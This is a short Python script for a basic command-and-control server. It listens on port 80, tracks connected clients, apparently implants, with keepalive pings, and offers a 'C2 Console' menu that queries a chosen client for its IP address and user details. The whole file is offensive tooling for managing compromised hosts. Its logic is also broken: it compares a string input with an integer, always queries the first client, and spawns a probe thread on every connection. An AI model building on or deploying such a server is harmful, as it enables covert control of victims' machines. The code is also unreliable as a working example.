#!/usr/bin/python

import socket
import time
import threading

host = "0.0.0.0"
port = 80
end=False

client_list = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(5)
print(f"Listening on port {port}")

def probe():
    global client_list
    while True:
        c_num = 0
        try:
            for c in range(len(client_list)):
                c_num = c
                client_list[c][1].send(b"?keepalive?\n")
        except:
            print(f"client {c_num} died - removing from list")
            client_list.pop(c_num)
        time.sleep(5)


def interact():
    global client_list
    if len(client_list) == 0:
        print("No clients to interact with yet! Returning to main menu...")
        return
    elif len(client_list) == 1:
        print("Getting client info from only available client 0")
        client_list[0][1].send(b":ipinfo::user:\n")
        time.sleep(1)
        info = client_list[0][1].recv(6000)
        info = info.decode('UTF-8')
        print(info)
        input("Press any key to return to main menu")
        return
    else:
        for c in range(len(client_list)):
            print(f"Client {c}:")
            print(client_list[c][0])
        client_num = input("Select client to interact with: ")
        if client_num < len(client_list)-1:
            print(f"Getting client info from only available client {client_num}")
            client_list[0][1].send(b":ipinfo::user:\n")
            info = client_list[0][1].recv(6000)
            info = info.decode('UTF-8')
            print(info)
            input("Press any key to return to main menu")
            return
        else:
            print("invalid client selected, returning to main menu")
            return


def init_main_socket():
    global client_list
    while True:
        conn, addr = s.accept()
        print(f"\n...accepted new connection from {addr[0]}:{addr[1]}\n")
        clientinfo = conn.recv(6000)
        clientinfo = clientinfo.decode('UTF-8')
        client_list.append([clientinfo, conn])
        
        handler_thread = threading.Thread(target=probe)
        handler_thread.daemon = True
        handler_thread.start()


def server_selection():
    global end
    print("Type 'h' for available commands.")

    command = input("C2 Console $ ")
    while command != "exit":
        if command == "h":
            out = "\nAvailable commands\n\n"
            out += "   h:        shows this message\n"
            out += "   interact: interact with a selected client\n"
            out += "   exit:     exits the server\n"
            print(out)
        elif command == "interact":
            interact()
        else:
            print("invalid command. Type 'h' to see available commands.\n")
        command = input("C2 Console $ ")
    end = True

handler_thread = threading.Thread(target=init_main_socket)
handler_thread.daemon = True
handler_thread.start()

handler_thread = threading.Thread(target=server_selection)
handler_thread.daemon = True
handler_thread.start()

while not end:
    time.sleep(1)
